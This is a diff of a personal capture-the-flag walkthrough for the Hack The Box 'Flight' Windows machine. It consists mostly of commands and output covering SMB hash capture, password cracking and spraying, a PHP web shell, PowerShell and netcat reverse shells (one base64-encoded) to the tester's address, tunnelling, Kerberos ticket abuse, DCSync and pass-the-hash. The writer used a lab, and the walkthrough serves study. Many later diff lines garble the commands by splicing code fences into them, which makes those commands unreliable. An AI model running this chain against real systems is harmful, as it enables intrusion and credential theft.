@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+	```
 nmap -sV -sC -vv 10.10.11.187
 nmap -sU --top-ports=10 -vv 10.10.11.187
 
@@ -65,7 +65,7 @@ PORT     STATE         SERVICE      REASON
 ## Directory Enumeration
 - Gobuster:
 	- Directory
-		```bash
+		```
 gobuster dir -u http://school.flight.htb dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root -x php
 ---OUTPUT---
 /images               (Status: 301) [Size: 347] [--> http://school.flight.htb/images/]
@@ -86,7 +86,7 @@ gobuster dir -u http://school.flight.htb dns --wordlist /usr/share/wordlists/dir
 
 ```
 - Ffuf
-	```bash
+	```
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://flight.htb/ -H 'Host: FUZZ.flight.htb' -fw 1546
 
 ---OUTPUT---
@@ -122,11 +122,11 @@ quanxunwangsong69691    [Status: 200, Size: 597, Words: 45, Lines: 15, Duration:
 		- Difference is LFI will execute php code while file disclosure will give us the code
 ### LFI Check
 - we try to include index.php in the view argument to capture the code (Burpsuite will be good for this)
-	```bash
+	```
 http://school.flight.htb/index.php?view=index.php
 ```
 	- we view the page source and file the php code of index.php:
-		```bash
+		```
 <?php if (!isset($_GET['view']) || $_GET['view'] == "home.html") { ?>
     <div id="tagline">
       <div>
@@ -161,7 +161,7 @@ if ((strpos(urldecode($_GET['view']),'..')!==false)||
 - We can try to make it reach us via smb
 	- to check turn on netcat listener and see if we get a response
 		- url: `http://school.flight.htb/index.php?view=//10.10.14.25/rocknrj/test`
-	```bash
+	```
 nc -lvnp 445
 
 --OUTPUT---
@@ -170,7 +170,7 @@ connect to [10.10.14.25] from (UNKNOWN) [10.10.11.187] 50035
 E�SMBr▒S�����"NT LM 0.12SMB 2.002SMB 2.??? 
 ```
 	- We start an smb server or simply use responder to listen to our interface as it will attempt to authenticate anyway:
-		```bash
+		```
 sudo responder -i tun0 
 --OR--
 impacker-smbserver rocknrj 'pwd' -smb2support
@@ -216,7 +216,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 ```
 - I copy all the hashes and try to crack it with john :
-	```bash
+	```
 vi hash # Copy all hashes here, each hash at a new line
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 
@@ -227,7 +227,7 @@ S@Ss!K@*t13      (svc_apache)
 S@Ss!K@*t13      (svc_apache)
 ```
 - We check these credentials (winrm doesn't work):
-	```bash
+	```
 netexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'     
 netexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
 
@@ -256,7 +256,7 @@ SMB         10.10.11.187    445    G0               Web             READ
 		- Web
 - Accessing each share I couldn't really find much
 - I tried to enumerate users with netexec:
-	```bash
+	```
 netexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --users                
 
 ---OUTPUT---
@@ -281,7 +281,7 @@ SMB         10.10.11.187    445    G0               O.Possum                    
 SMB         10.10.11.187    445    G0               [*] Enumerated 15 local users: flight
 ```
 	- copied users to a file and cleaned it (i manually did little cleaning of fixedusers file):
-		```bash
+		```
 netexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --users > smbusers
 cat smbusers | awk '{print $5}' > fixedusers
 # Some manual cleaning: removed first 3 and last line
@@ -307,7 +307,7 @@ O.Possum
 -----
 ## LDAPsearch (alternate way of getting users)
 - We try ldapsearch with these credentials (also works with svc_apache):
-	```bash
+	```
 ldapsearch -H ldap://10.10.11.187 -D 'S.Moon@flight.htb' -w 'S@Ss!K@*t13' -b "DC=flight,DC=htb"
 ldapsearch -H ldap://10.10.11.187 -D 'S.Moon@flight.htb' -w 'S@Ss!K@*t13' -b "DC=flight,DC=htb" '(ObjectClass=user)' sAMAccountName | grep "sAMAccountName"
 ldapsearch -H ldap://10.10.11.187 -D 'S.Moon@flight.htb' -w 'S@Ss!K@*t13' -b "DC=flight,DC=htb" '(ObjectClass=user)' sAMAccountName | grep -i "pwd"
@@ -316,7 +316,7 @@ ldapsearch -H ldap://10.10.11.187 -D 'S.Moon@flight.htb' -w 'S@Ss!K@*t13' -b "DC
 	- We find one new user in the second command but it's a machine account (GO$)
 ----
 - I check password policy to see if we can brute force:
-	```bash
+	```
 netexec smb 10.10.11.187 --pass-pol -u 'svc_apache' -p 'S@Ss!K@*t13'
 
 ---OUTPUT-RELEVANT---
@@ -324,7 +324,7 @@ Account Lockout Threshold: None
 ```
 	- We can brute force
 - We try our credentials on all users:
-	```bash
+	```
 netexec smb 10.10.11.187 -u fixedusers -p 'S@Ss!K@*t13' --continue-on-success
 
 ---OUTPUT-RELEVANT---
@@ -336,7 +336,7 @@ SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K
 - **NEW TOOL** : NTLM_Theft : https://github.com/Greenwolf/ntlm_theft
 	- Can do manually also, check ippsec.rocks
 	- I use ntlm_theft to create all files :
-		```bash
+		```
 pipx install xlsxwriter              
 python3 ntlm_theft.py -g all -s 10.10.14.25 -f rocknrj
 cd rocknrj
@@ -365,8 +365,7 @@ Created: rocknrj/desktop.ini (BROWSE TO FOLDER)
 Generation Complete.
 ```
 - I turn on responder and move to the folder and then smbclient back into the share and start putting each one in until one works. When one does, I wait for a bit to see if the responder gets anything. If nothing, I conitnue on and repeat the process till I get a hit (hopefully). I use mput to put all files and without turning off prompt, I click yes for each until one succeeds : **desktop.ini**
-	```bash
-smb: \> mput *
+	```: \> mput *
 
 ---OUTPUT---
 Put file zoom-attack-instructions.txt? y
@@ -382,7 +381,7 @@ putting file desktop.ini as \desktop.ini (0.9 kb/s) (average 0.9 kb/s)
 ```
 - We grab a hash on the responder:
 	```bash
-sudo respoder -I tun0
+s```poder -I tun0
 
 ---OUTPUT---
 [+] Listening for events...                                                                                                                                 
@@ -393,7 +392,7 @@ sudo respoder -I tun0
 ```
 - We crack the hash with john:
 	```bash
-vi cbum.hash # copy hash here
+v```hash # copy hash here
 john cbum.hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 ---OUTPUT---
@@ -403,7 +402,7 @@ Tikkycoll_431012284 (c.bum)
 ## Initial Foothold on System
 - We check credentials on the shares:
 	```bash
-netexec smb 10.10.11.187 -u 'C.Bum' -p 'Tikkycoll_431012284' --shares
+n```10.10.11.187 -u 'C.Bum' -p 'Tikkycoll_431012284' --shares
 
 ---OUTPUT---
 SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
@@ -432,7 +431,7 @@ system($_REQUEST['rocknrj']);
 ```
 		- I copied the one liner from the Invoke-PowershellTcpOneLine.ps1 file with my ip and port and added it to burp, url encoded it and sent:
 			```bash
-# Main code
+# M```e
 powershell "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.25',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 --------------------------------------------------------------------------------
 #url encoded in burpsuite:
@@ -442,21 +441,21 @@ GET /shell.php/?rocknrj=powershell+"$client+%3d+New-Object+System.Net.Sockets.TC
 			- I get a reverse shell as svc_apache
 	- nc.exe : I send nc.exe also to the flag.htb web location andthen pass this command in the url while having netcat listening on the port (9998 for me)
 		```bash
-nc.exe -e powershell.exe 10.10.14.25 9998
+nc``` powershell.exe 10.10.14.25 9998
 
 # Full url
 http://flight.htb/shell.php/?rocknrj=nc.exe%20-e%20powershell.exe%2010.10.14.25%209998
 ```
 	- For both I have netcat listening on the relevant port:
 		```bash
-sudo nc -lvnp 9999
+su```lvnp 9999
 sudo nc -lvnp 9998
 ```
 		- I get the reverse shell.
 - But we are svc_apache user.
 - On checking running processes we see there are some our nmap didn't catch (8000,9389...)
 	```bash
-netstat -ano | findstr LISTENING
+n```-ano | findstr LISTENING
 ---OUTPUT---
   TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5556
   TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       640
@@ -516,7 +515,7 @@ netstat -ano | findstr LISTENING
 	- This shows there's probably something running on this machine in localhost 
 		- but we can't reach it from our target (maybe due to firewall) (can try with ping)
 			```bash
-nc -zv 10.10.11.187 9389
+nc ```10.11.187 9389
 
 ---OUTPUT---
 flight.htb [10.10.11.187] 9389 (?) open
@@ -531,7 +530,7 @@ nc -zv 10.10.11.187 8000
 - On enumerating we see inetpub showing that there is IIS
 	- Looking at the folders I check with icacls who owns them
 		```bash
-icacls development
+ic```velopment
 
 ---OUTPUT---
 icacls development
@@ -554,11 +553,11 @@ Successfully processed 1 files; Failed processing 0 files
 	- runas in system doesnt allow us to input pwd and requires tty
 	- we upload RunasCs.exe (have python server running on directory with RunasCs.exe)
 		```bash
-curl "http://10.10.14.25:8001/RunasCs.exe" -o "RunasCs.exe"
+cu```p://10.10.14.25:8001/RunasCs.exe" -o "RunasCs.exe"
 ```
 	- We listen on netcat on the relevant port and pass the command in the target:
 		```bash
-.\RunasCs.exe C.Bum Tikkycoll_431012284 powershell.exe -r 10.10.14.25:9999
+.\```.exe C.Bum Tikkycoll_431012284 powershell.exe -r 10.10.14.25:9999
 
 ---OUTPUT----
 [*] Warning: The logon for user 'C.Bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
@@ -581,26 +580,26 @@ curl "http://10.10.14.25:8001/RunasCs.exe" -o "RunasCs.exe"
 		- linux (server)
 	- We turn on our python server like before and grab the windows file from our target:
 		```bash
-curl "http://10.10.14.25:8001/chisel_1.10.1_windows_amd64" -o chisel.exe
+cu```p://10.10.14.25:8001/chisel_1.10.1_windows_amd64" -o chisel.exe
 ```
 	- We run the chisel executable on our linux as a server:
 		```bash
-chmod +x chisel_1.10.1_linux_amd64
+ch```chisel_1.10.1_linux_amd64
 ./chisel_1.10.1_linux_amd64 server -p 9001 --reverse
 ```
 	- We run the chisel as a client on our windows target to connect to us and allow us to connect to localhost:8000 via port 8002:
 		```bash
-./chisel.exe client 10.10.14.25:9001 R:8002:127.0.0.1:8000
+./```exe client 10.10.14.25:9001 R:8002:127.0.0.1:8000
 ```
 	- With this we create a tunnel for our commands to reach the localhost where development exists
 		- To check we can curl the localhost from 8002 port:
 			```bash
-curl localhost:8002
+cur```host:8002
 ```
 			- We get a page
 		- Now we can turn on our netcat listener at the port we set for the aspx reverse shell and then curl that file:
 			```bash
-nc -lvnp 9898
+nc ```898
 
 --ON-ANOTHER-SHELL--
 curl localhost:8002/reverse.aspx
@@ -609,7 +608,7 @@ curl localhost:8002/reverse.aspx
 		- It is a system account
 			- We can check by turning responder on and trying to reach a share like before:
 				```bash
-sudo responder -I tun0
+sudo```der -I tun0
 
 ---ON-TARGET---
 //10.10.14.25/rocknrj/test
@@ -623,16 +622,16 @@ sudo responder -I tun0
 	- alternatively we can use laudanum shell and access it via the url and then pass the nc.exe command to gain a shell
 		- After uploading laudanum shell enter this in url while having nc listening:
 			```bash
-C:\ProgramData\nc.exe -e powershell.exe 10.10.14.25 9998
+C:\```Data\nc.exe -e powershell.exe 10.10.14.25 9998
 ```
 			- For a better shell type this instead for listening:
 				```bash
-rlwrap nc -lvnp 9998
+rlwr```lvnp 9998
 ```
 ## Privilege Escalation
 - On enumerating we pass whoami /all and see we have SeImpersonatePrivilege:
 	```bash
-whoami /all
+w```all
 USER INFORMATION
 ----------------
 
@@ -687,13 +686,13 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 - To do this we use rubeus to get a tgt from this account as it's a system account and then perform DCSync to grab admin hash
 	- We grab Rubeus.exe from our local macine and run it to see if it works/shows no errors.
 		```bash
-cd C:\ProgramData
+cd```gramData
 curl "http://10.10.14.25:8001/Rubeus.exe" -o "Rubeus.exe"
 .\Rubeus.exe
 ```
 	- Then we get the ticket:
 		```bash
-.\Rubeus.exe tgtdeleg /nowrap
+.\```exe tgtdeleg /nowrap
 
 ---OUTPUT---
 
@@ -723,11 +722,11 @@ curl "http://10.10.14.25:8001/Rubeus.exe" -o "Rubeus.exe"
 ```
 	- We grab the data and store it in a file:
 		```bash
-vi ticket.kirbi # copy content here
+vi```.kirbi # copy content here
 ```
 	- Then using kirbi2ccache.py (https://github.com/skelsec/minikerberos/blob/main/minikerberos/examples/kirbi2ccache.py) I try to convert it but it fails. This is because the file is encoded.
 		```bash
-mv ticket.kirbi ticket.kirbi.b64
+mv```.kirbi ticket.kirbi.b64
 base64 -d ticket.kirbi.b64 > ticket.kirbi
 python3 kirbi2ccache.py ticket.kirbi ticket.ccache
 
@@ -738,7 +737,7 @@ INFO:root:Done!
 ```
 - Using this ticket we can perform DCSync and grab the Administrator hash (FAILS)
 	```bash
-export KRB5CCNAME=ticket.ccache
+e```RB5CCNAME=ticket.ccache
 impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator
 
 ---OUTPUT-FAIL---
@@ -752,7 +751,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 ```
 	- As we see it's a clock skew error so we sync our clock with the target and try again
 		```bash
-sudo ntpdate 10.10.11.187
+su```ate 10.10.11.187
 impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator
 
 ---OUTPUT---
@@ -770,7 +769,7 @@ Administrator:des-cbc-md5:c7754cb5498c2a2f
 	- We can psexec into the machine using Pass the Hash (can use netexec smb to check and we will get pwned)
 		- winrm doesn't work but if we check the processes, the port is listening...so maybe due to firewall
 		```bash
-impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c administrator@10.10.11.187
+im```psexec -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c administrator@10.10.11.187
 
 ---OUTPUT---
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -797,7 +796,7 @@ nt authority\system
 ### GodPotato
 - **Copy root flag without becoming admin**
 	```bash
-.\gp.exe -cmd "C:\windows\system32\cmd.exe /c type c:\users\administrator\desktop\root.txt > c:\ProgramData\root.txt"
+.``` -cmd "C:\windows\system32\cmd.exe /c type c:\users\administrator\desktop\root.txt > c:\ProgramData\root.txt"
 
 ---OUTPUT---
 [*] CombaseModule: 0x140717067141120
@@ -829,7 +828,7 @@ nt authority\system
 ```
 	- Alternatively can directly read:
 		```bash
-.\gp.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+.\```-cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
 
 
 ---OUTPUT---
@@ -863,11 +862,11 @@ nt authority\system
 - **Reverse PowerShell base64 command**
 	- got a one liner from here (Reverse>Powershell #3 Base64 for my IP): https://www.revshells.com/
 		```bash
-.\gp.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA1ACIALAA5ADkAOQA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+.\```-cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA1ACIALAA5ADkAOQA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
 ```
 	- With netcat listening on my relevant port:
 		```bash
-nc -lvnp 9997
+nc```9997
 
 ---OUTPUT---
 nc -lvnp 9997
@@ -879,7 +878,7 @@ nt authority\system
 ```
 - **Reverse Shell with netcat**
 	```bash
-.\gp.exe -cmd "C:\windows\system32\cmd.exe /c C:\ProgramData\nc.exe -e C:\windows\system32\cmd.exe 10.10.14.25 9997"
+.``` -cmd "C:\windows\system32\cmd.exe /c C:\ProgramData\nc.exe -e C:\windows\system32\cmd.exe 10.10.14.25 9997"
 
 ---OUTPUT---
 [*] CombaseModule: 0x140715642716160
@@ -910,7 +909,7 @@ nt authority\system
 ```
 - I try this command but it fails:
 	```bash
-.\JuicyPotatoNG.exe -t * -p "C:\ProgramData\nc.exe" -a '10.10.14.25 9997 -e cmd
+.```otatoNG.exe -t * -p "C:\ProgramData\nc.exe" -a '10.10.14.25 9997 -e cmd
 
 ---OUTPUT---
 ./JuicyPotatoNG.exe -t * -p "C:\ProgramData\nc.exe" -a '10.10.14.25 9997 -e cmd'
@@ -933,7 +932,7 @@ C:\ProgramData>.\JuicyPotatoNG.exe -t * -p "C:\ProgramData\nc.exe" -a '10.10.14.
 ## Possibility for why JuicyPotato isn't working:
 - Systeminfo:
 	```bash
-systeminfo
+s```fo
 
 ---RELEVANT-OUTPUT---
 Host Name:                 G0
